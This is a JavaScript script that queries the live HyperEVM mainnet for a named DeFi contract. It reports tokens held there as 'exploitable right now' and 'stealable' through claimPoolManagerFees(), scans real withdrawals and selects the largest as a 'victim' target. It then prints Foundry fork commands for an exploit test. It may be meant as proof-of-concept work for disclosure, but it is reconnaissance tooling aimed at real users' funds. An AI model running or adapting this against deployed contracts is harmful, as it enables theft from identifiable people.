/**
 * HyperEVM Mainnet State Checker
 * Finds real withdrawal transactions to exploit in fork
 */

const { ethers } = require('ethers');

const CONFIG = {
    MAINNET_RPC: 'https://rpc.hyperliquid.xyz/evm',
    TESTNET_RPC: 'https://api.hyperliquid-testnet.xyz/evm',
    CHAIN_ID: 999,
    
    STEXAMM: '0x39694eFF3b02248929120c73F90347013Aec834d',
    WHYPE: '0x5555555555555555555555555555555555555555',
    STHYPE: '0xfFaa4a3D97fE9107Cef8a3F48c069F577Ff76cC1',
    
    EXPLORER: 'https://hyperevmscan.io'
};

const STEXAMM_ABI = [
    'function pool() view returns (address)',
    'function token0() view returns (address)',
    'function token1() view returns (address)',
    'function totalSupply() view returns (uint256)',
    'event Withdraw(address indexed sender, address indexed recipient, uint256 amount0, uint256 amount1, uint256 shares)',
    'event PoolManagerFeesClaimed(uint256 amount0, uint256 amount1)',
    'event Deposit(address indexed sender, address indexed recipient, uint256 amount, uint256 shares)'
];

const ERC20_ABI = [
    'function balanceOf(address) view returns (uint256)',
    'function decimals() view returns (uint8)',
    'function symbol() view returns (string)'
];

const POOL_ABI = [
    'function getReserves() view returns (uint256, uint256)'
];

async function checkMainnetState() {
    console.log('═══════════════════════════════════════════════════════════');
    console.log('  MAINNET STATE ANALYSIS - Finding Exploit Opportunities');
    console.log('═══════════════════════════════════════════════════════════\n');
    
    const provider = new ethers.JsonRpcProvider(CONFIG.MAINNET_RPC);
    
    // Verify connection
    const network = await provider.getNetwork();
    console.log(`   Connected to HyperEVM Mainnet (Chain ID: ${network.chainId})\n`);
    
    const stexamm = new ethers.Contract(CONFIG.STEXAMM, STEXAMM_ABI, provider);
    const whype = new ethers.Contract(CONFIG.WHYPE, ERC20_ABI, provider);
    const sthype = new ethers.Contract(CONFIG.STHYPE, ERC20_ABI, provider);
    
    // Current block
    const currentBlock = await provider.getBlockNumber();
    console.log(`📍 Current Block: ${currentBlock}\n`);
    
    // Check current balances
    console.log('═══════════════════════════════════════════════════════════');
    console.log('  CURRENT VULNERABLE STATE');
    console.log('═══════════════════════════════════════════════════════════\n');
    
    const whypeBalance = await whype.balanceOf(CONFIG.STEXAMM);
    const sthypeBalance = await sthype.balanceOf(CONFIG.STEXAMM);
    
    console.log('   Tokens Currently in STEXAMM Contract:');
    console.log(`   WHYPE:  ${ethers.formatEther(whypeBalance)}`);
    console.log(`   stHYPE: ${ethers.formatEther(sthypeBalance)}`);
    
    const totalValue = (parseFloat(ethers.formatEther(whypeBalance)) + 
                       parseFloat(ethers.formatEther(sthypeBalance))) * 37;
    console.log(`   Est Value: $${totalValue.toFixed(2)} USD\n`);
    
    if (whypeBalance > 0n || sthypeBalance > 0n) {
        console.log('   EXPLOITABLE RIGHT NOW!');
        console.log('   These funds can be stolen via claimPoolManagerFees()\n');
    }
    
    // Get pool info
    const poolAddress = await stexamm.pool();
    const pool = new ethers.Contract(poolAddress, POOL_ABI, provider);
    const [reserve0, reserve1] = await pool.getReserves();
    
    console.log('═══════════════════════════════════════════════════════════');
    console.log('  POOL RESERVES & TVL');
    console.log('═══════════════════════════════════════════════════════════\n');
    
    console.log('   Pool Reserves:');
    console.log(`   stHYPE: ${ethers.formatEther(reserve0)}`);
    console.log(`   WHYPE:  ${ethers.formatEther(reserve1)}`);
    
    const tvl = (parseFloat(ethers.formatEther(reserve0)) + 
                 parseFloat(ethers.formatEther(reserve1))) * 37;
    console.log(`   TVL: $${tvl.toFixed(2)} USD\n`);
    
    // Find recent withdrawals
    console.log('═══════════════════════════════════════════════════════════');
    console.log('  SCANNING FOR WITHDRAWAL TRANSACTIONS');
    console.log('═══════════════════════════════════════════════════════════\n');
    
    // HyperEVM RPC has 1000 block limit
    const lookbackBlocks = 999;
    const fromBlock = Math.max(0, currentBlock - lookbackBlocks);
    
    console.log(` Scanning blocks ${fromBlock} to ${currentBlock} (last 999 blocks)...\n`);
    
    const withdrawFilter = stexamm.filters.Withdraw();
    let withdrawals = [];
    
    try {
        withdrawals = await stexamm.queryFilter(withdrawFilter, fromBlock, currentBlock);
    } catch (error) {
        console.log('    Error scanning events:', error.message);
        console.log('   Continuing with available data...\n');
    }
    
    console.log(`   Found ${withdrawals.length} withdrawal transactions\n`);
    
    if (withdrawals.length === 0) {
        console.log('    No recent withdrawals found.');
        console.log('   We can still prove vulnerability with a simulated withdrawal.\n');
        return { currentBlock, withdrawals: [], hasVulnerableFunds: whypeBalance > 0n || sthypeBalance > 0n };
    }
    
    // Analyze withdrawals
    console.log(' RECENT WITHDRAWALS (Most Recent First):\n');
    
    const recentWithdrawals = withdrawals.slice(-10).reverse();
    const exploitableWithdrawals = [];
    
    for (let i = 0; i < Math.min(5, recentWithdrawals.length); i++) {
        const w = recentWithdrawals[i];
        const tx = await provider.getTransaction(w.transactionHash);
        const receipt = await provider.getTransactionReceipt(w.transactionHash);
        
        const amount1 = ethers.formatEther(w.args.amount1);
        const usdValue = parseFloat(amount1) * 37;
        
        console.log(`${i + 1}. Block ${w.blockNumber} (${currentBlock - w.blockNumber} blocks ago)`);
        console.log(`   Tx: ${w.transactionHash}`);
        console.log(`   Recipient: ${w.args.recipient}`);
        console.log(`   Amount: ${amount1} WHYPE (~$${usdValue.toFixed(2)})`);
        console.log(`   Gas Used: ${receipt.gasUsed.toString()}`);
        console.log(`   Status: ${receipt.status === 1 ? '   Success' : '❌ Failed'}`);
        console.log(`   Explorer: ${CONFIG.EXPLORER}/tx/${w.transactionHash}\n`);
        
        if (receipt.status === 1 && parseFloat(amount1) > 0) {
            exploitableWithdrawals.push({
                blockNumber: w.blockNumber,
                txHash: w.transactionHash,
                recipient: w.args.recipient,
                amount: amount1,
                usdValue: usdValue
            });
        }
    }
    
    // Find best target
    if (exploitableWithdrawals.length > 0) {
        console.log('═══════════════════════════════════════════════════════════');
        console.log('  EXPLOIT TARGET SELECTION');
        console.log('═══════════════════════════════════════════════════════════\n');
        
        // Pick highest value withdrawal
        const target = exploitableWithdrawals.reduce((max, w) => 
            w.usdValue > max.usdValue ? w : max
        );
        
        console.log(' SELECTED TARGET FOR FORK EXPLOIT:');
        console.log(`   Block: ${target.blockNumber}`);
        console.log(`   Tx: ${target.txHash}`);
        console.log(`   Victim: ${target.recipient}`);
        console.log(`   Amount: ${target.amount} WHYPE`);
        console.log(`   Value: $${target.usdValue.toFixed(2)} USD`);
        console.log(`   \n   This transaction will be exploited in our fork proof!\n`);
        
        return {
            currentBlock,
            withdrawals: exploitableWithdrawals,
            targetWithdrawal: target,
            hasVulnerableFunds: whypeBalance > 0n || sthypeBalance > 0n
        };
    }
    
    return { 
        currentBlock, 
        withdrawals: exploitableWithdrawals,
        hasVulnerableFunds: whypeBalance > 0n || sthypeBalance > 0n 
    };
}

async function generateFoundryForkCommand(data) {
    console.log('═══════════════════════════════════════════════════════════');
    console.log('  FOUNDRY FORK COMMANDS');
    console.log('═══════════════════════════════════════════════════════════\n');
    
    if (data.targetWithdrawal) {
        const forkBlock = data.targetWithdrawal.blockNumber - 1;
        
        console.log('   Use this command to fork at the vulnerable block:\n');
        console.log(`forge test --match-test testMainnetForkExploit \\`);
        console.log(`  --fork-url https://rpc.hyperliquid.xyz/evm \\`);
        console.log(`  --fork-block-number ${forkBlock} \\`);
        console.log(`  -vvvv\n`);
        
        console.log('   Or set in foundry.toml:\n');
        console.log(`[profile.mainnet]`);
        console.log(`fork_url = "https://rpc.hyperliquid.xyz/evm"`);
        console.log(`fork_block_number = ${forkBlock}\n`);
        
        return forkBlock;
    } else {
        console.log('   Fork at current block:\n');
        console.log(`forge test --match-test testMainnetForkExploit \\`);
        console.log(`  --fork-url https://rpc.hyperliquid.xyz/evm \\`);
        console.log(`  --fork-block-number ${data.currentBlock} \\`);
        console.log(`  -vvvv\n`);
        
        return data.currentBlock;
    }
}

// Run analysis
checkMainnetState()
    .then(async (data) => {
        const forkBlock = await generateFoundryForkCommand(data);
        
        console.log('═══════════════════════════════════════════════════════════');
        console.log('  NEXT STEPS');
        console.log('═══════════════════════════════════════════════════════════\n');
        
        console.log('1.    Mainnet state analyzed');
        console.log('2.  Copy the fork command above');
        console.log('3.  Run the Foundry fork test (next artifact)');
        console.log('4.    Generate Tenderly simulation');
       
        
        // Save data for next steps
        const fs = require('fs');
        fs.writeFileSync('mainnet_analysis.json', JSON.stringify({
            ...data,
            forkBlock,
            timestamp: new Date().toISOString()
        }, null, 2));
        
        console.log('   Analysis saved to: mainnet_analysis.json\n');
        console.log('   Ready for Phase 2: Foundry Fork Exploit!\n');
    })
    .catch(console.error);